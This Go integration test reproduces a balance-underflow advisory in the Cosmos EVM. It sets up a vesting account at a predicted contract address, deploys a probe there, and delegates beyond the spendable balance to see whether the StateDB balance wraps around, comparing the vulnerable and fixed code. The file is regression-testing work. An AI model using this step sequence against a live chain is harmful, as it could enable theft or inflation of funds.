// Pure reproduction for GHSA-7g4w-cg88-2cq2 ("Balance underflow in EVM StateDB").
//
// This file is copied by cases/ghsa-7g4w/run.sh into
// evmd/tests/integration/atomicos_ghsa7g4w/ of both the vulnerable and the fixed worktree.
//
// Scenario (state setup mirrors the public post-mortem, without any fund movement):
//  1. A delayed vesting account is created (MsgCreateVestingAccount) at the address where
//     the probe contract will be deployed, and it also receives some spendable coins.
//  2. The probe contract is deployed at that address, so the contract account is a vesting account.
//  3. The probe delegates through the staking precompile and reports its EVM-visible
//     balance (StateDB) right before and right after the precompile call.
//
// Bug-specific check (this is a reproduction test, not the general judge):
//   delegating more than the spendable balance must not make the StateDB balance wrap around.
//
// The calls are made with eth_call, so nothing is committed; the observation is the value
// the EVM itself sees inside the transaction.
package atomicosghsa7g4w

import (
	"encoding/json"
	"fmt"
	"math/big"
	"strings"
	"testing"
	"time"

	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	sdkmath "cosmossdk.io/math"

	sdk "github.com/cosmos/cosmos-sdk/types"
	vestingexported "github.com/cosmos/cosmos-sdk/x/auth/vesting/exported"
	vestingtypes "github.com/cosmos/cosmos-sdk/x/auth/vesting/types"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"

	"github.com/cosmos/evm/evmd/tests/integration"
	basefactory "github.com/cosmos/evm/testutil/integration/base/factory"
	"github.com/cosmos/evm/testutil/integration/evm/factory"
	"github.com/cosmos/evm/testutil/integration/evm/grpc"
	"github.com/cosmos/evm/testutil/integration/evm/network"
	testkeyring "github.com/cosmos/evm/testutil/keyring"
	testutiltypes "github.com/cosmos/evm/testutil/types"
	evmtypes "github.com/cosmos/evm/x/vm/types"
)

var two256 = new(big.Int).Lsh(big.NewInt(1), 256)

func loadProbe(t *testing.T) evmtypes.CompiledContract {
	t.Helper()
	parsed, err := abi.JSON(strings.NewReader(probeABI))
	require.NoError(t, err)
	return evmtypes.CompiledContract{ABI: parsed, Bin: common.FromHex(probeBin)}
}

type probeResult struct {
	ok            bool
	before, after *big.Int
	vmErr         string // EVM-level error (revert, out of gas, ...)
	callErr       string // error or panic returned by the query itself
}

func (r probeResult) String() string {
	if r.callErr != "" || r.vmErr != "" {
		return fmt.Sprintf("vmErr=%q callErr=%q", r.vmErr, truncate(r.callErr, 300))
	}
	return fmt.Sprintf("ok=%v before=%s after=%s", r.ok, r.before, r.after)
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// ethCallProbe runs probe(validator, amount) from `from` against the contract at `to` with eth_call.
func ethCallProbe(t *testing.T, nw *network.UnitTestNetwork, contract evmtypes.CompiledContract, from, to common.Address, validator string, amount *big.Int) (res probeResult) {
	t.Helper()
	input, err := contract.ABI.Pack("probe", validator, amount)
	require.NoError(t, err)
	data := hexutil.Bytes(input)
	gas := hexutil.Uint64(5_000_000)
	args, err := json.Marshal(evmtypes.TransactionArgs{From: &from, To: &to, Gas: &gas, Input: &data})
	require.NoError(t, err)

	defer func() {
		if r := recover(); r != nil {
			res.callErr = fmt.Sprintf("panic: %v", r)
		}
	}()

	ctx := nw.GetContext()
	resp, err := nw.GetEvmClient().EthCall(ctx, &evmtypes.EthCallRequest{
		Args:            args,
		GasCap:          25_000_000,
		ProposerAddress: ctx.BlockHeader().ProposerAddress,
		ChainId:         nw.GetEIP155ChainID().Int64(),
	})
	if err != nil {
		res.callErr = err.Error()
		return res
	}
	if resp.VmError != "" {
		res.vmErr = resp.VmError
		return res
	}
	out, err := contract.ABI.Unpack("probe", resp.Ret)
	require.NoError(t, err)
	res.ok = out[0].(bool)
	res.before = out[1].(*big.Int)
	res.after = out[2].(*big.Int)
	return res
}

func TestGHSA7g4w_VestingDelegateBeyondSpendable(t *testing.T) {
	kr := testkeyring.New(2)
	nw := network.NewUnitTestNetwork(integration.CreateEvmd, network.WithPreFundedAccounts(kr.GetAllAccAddrs()...))
	gh := grpc.NewIntegrationHandler(nw)
	tf := factory.New(nw, gh)
	deployer, funder := kr.GetKey(0), kr.GetKey(1)
	bank := nw.App.GetBankKeeper()

	ctx := nw.GetContext()
	bondDenom, err := nw.App.GetStakingKeeper().BondDenom(ctx)
	require.NoError(t, err)
	require.Equal(t, bondDenom, evmtypes.GetEVMCoinDenom(), "scenario assumes the EVM gas token is the bond denom")

	lockedAmt := sdkmath.NewInt(4e18) // vesting (locked) part
	freeAmt := sdkmath.NewInt(1e18)   // spendable part

	// 1. Predict the CREATE address of the probe contract.
	nonce := nw.App.GetEVMKeeper().GetNonce(ctx, deployer.Addr)
	probeAddr := crypto.CreateAddress(deployer.Addr, nonce)
	probeAcc := sdk.AccAddress(probeAddr.Bytes())

	// 2. Create a delayed vesting account at that address (MsgCreateVestingAccount is permissionless).
	endTime := ctx.BlockTime().Add(365 * 24 * time.Hour).Unix()
	res, err := tf.ExecuteCosmosTx(funder.Priv, basefactory.CosmosTxArgs{Msgs: []sdk.Msg{
		vestingtypes.NewMsgCreateVestingAccount(funder.AccAddr, probeAcc, sdk.NewCoins(sdk.NewCoin(bondDenom, lockedAmt)), endTime, true),
	}})
	require.NoError(t, err)
	require.True(t, res.IsOK(), "create vesting account: %s", res.Log)
	require.NoError(t, nw.NextBlock())

	// 3. Give the account some spendable coins too.
	res, err = tf.ExecuteCosmosTx(funder.Priv, basefactory.CosmosTxArgs{Msgs: []sdk.Msg{
		banktypes.NewMsgSend(funder.AccAddr, probeAcc, sdk.NewCoins(sdk.NewCoin(bondDenom, freeAmt))),
	}})
	require.NoError(t, err)
	require.True(t, res.IsOK(), "send spendable coins: %s", res.Log)
	require.NoError(t, nw.NextBlock())

	// 4. Deploy the probe so that its code lives at the vesting address.
	contract := loadProbe(t)
	addr, err := tf.DeployContract(deployer.Priv, evmtypes.EvmTxArgs{}, testutiltypes.ContractDeploymentData{Contract: contract})
	require.NoError(t, err)
	require.Equal(t, probeAddr, addr, "probe must be deployed at the predicted vesting address")
	require.NoError(t, nw.NextBlock())

	ctx = nw.GetContext()
	acct := nw.App.GetAccountKeeper().GetAccount(ctx, probeAcc)
	_, isVesting := acct.(vestingexported.VestingAccount)
	require.True(t, isVesting, "account at the probe address must still be a vesting account, got %T", acct)
	total := bank.GetBalance(ctx, probeAcc, bondDenom).Amount
	spendable := bank.SpendableCoin(ctx, probeAcc, bondDenom).Amount
	locked := bank.LockedCoins(ctx, probeAcc).AmountOf(bondDenom)
	t.Logf("REPRO account %s type=%T bank: total=%s spendable=%s locked=%s", probeAddr.Hex(), acct, total, spendable, locked)

	validator := nw.GetValidators()[0].OperatorAddress

	// 5a. Control: delegate an amount within the spendable balance.
	within := new(big.Int).Quo(spendable.BigInt(), big.NewInt(2))
	control := ethCallProbe(t, nw, contract, deployer.Addr, probeAddr, validator, within)
	t.Logf("REPRO control: delegate(amount=%s <= spendable=%s) -> %s", within, spendable, control)
	assert.True(t, control.ok && control.callErr == "" && control.vmErr == "",
		"control delegation within the spendable balance should succeed")

	// 5b. Target: delegate more than spendable but not more than total.
	//     x/staking allows this for vesting accounts (locked coins can be delegated).
	beyond := new(big.Int).Add(spendable.BigInt(), new(big.Int).Quo(locked.BigInt(), big.NewInt(2)))
	target := ethCallProbe(t, nw, contract, deployer.Addr, probeAddr, validator, beyond)
	wrapped := target.ok && target.after != nil && target.after.Cmp(target.before) > 0
	distance := "-"
	if target.after != nil {
		distance = new(big.Int).Sub(two256, target.after).String()
	}
	t.Logf("REPRO target: delegate(amount=%s > spendable=%s, <= total=%s) -> %s | 2^256-after=%s | wrapped=%v",
		beyond, spendable, total, target, distance, wrapped)
	// Only two outcomes say something about the underflow, and only they are accepted:
	//   (a) the delegation call itself succeeded (no query error, no VM error, delegate returned
	//       true): then the StateDB balance must not have wrapped around (vulnerable: it does);
	//   (b) the call was rejected by the underflow guard of the fix ("state balance underflow").
	// Any other failure (revert, out of gas, delegate returning false, another panic, a query
	// error) is not evidence either way and fails the test.
	const underflowRejection = "state balance underflow"
	succeeded := target.callErr == "" && target.vmErr == "" && target.ok
	rejected := strings.Contains(target.callErr, underflowRejection) || strings.Contains(target.vmErr, underflowRejection)
	switch {
	case succeeded:
		assert.False(t, wrapped,
			"StateDB balance wrapped around after delegating more than the spendable balance (underflow): before=%s after=%s",
			target.before, target.after)
	case rejected:
		// guarded: the fix refused the underflowing balance change
	default:
		t.Errorf("target delegation neither succeeded nor was rejected with %q, so the test cannot judge the underflow; outcome: %s",
			underflowRejection, target)
	}

	// 6. Informational only (no assertion): send the same call as a real transaction and look
	//    only at the state before and after the transaction, like an RPC-based checker would.
	func() {
		defer func() {
			if r := recover(); r != nil {
				t.Logf("REPRO real-tx: panic outside the tx: %v", r)
			}
		}()
		ctx := nw.GetContext()
		supplyBefore := bank.GetSupply(ctx, bondDenom).Amount
		balBefore := bank.GetBalance(ctx, probeAcc, bondDenom).Amount
		txRes, txErr := tf.ExecuteContractCall(deployer.Priv,
			evmtypes.EvmTxArgs{To: &probeAddr, GasLimit: 2_000_000},
			testutiltypes.CallArgs{ContractABI: contract.ABI, MethodName: "probe", Args: []interface{}{validator, beyond}},
		)
		blockErr := nw.NextBlock()
		ctx = nw.GetContext()
		supplyAfter := bank.GetSupply(ctx, bondDenom).Amount
		balAfter := bank.GetBalance(ctx, probeAcc, bondDenom).Amount
		errStr := ""
		if txErr != nil {
			errStr = txErr.Error()
		}
		t.Logf("REPRO real-tx: delegate(amount=%s) code=%d err=%q nextBlockErr=%v | supply %s -> %s (delta %s) | probe bank balance %s -> %s",
			beyond, txRes.Code, truncate(errStr, 300), blockErr,
			supplyBefore, supplyAfter, supplyAfter.Sub(supplyBefore), balBefore, balAfter)
	}()
}
